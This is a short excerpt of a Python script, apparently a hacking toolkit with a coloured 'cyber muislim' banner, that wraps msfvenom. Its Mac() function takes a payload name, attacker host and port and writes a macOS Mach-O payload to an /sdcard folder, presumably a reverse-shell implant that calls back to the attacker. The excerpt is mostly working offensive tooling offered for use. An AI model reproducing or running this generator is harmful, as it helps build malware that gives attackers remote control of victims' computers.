...
\033[1;30mcyber \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mmuislim\033[1;31m/~  \033[1;36m"""))
...
def Mac ():
	...
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f macho -o /sdcard/cyber_muslim/"+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	output_pld (output)
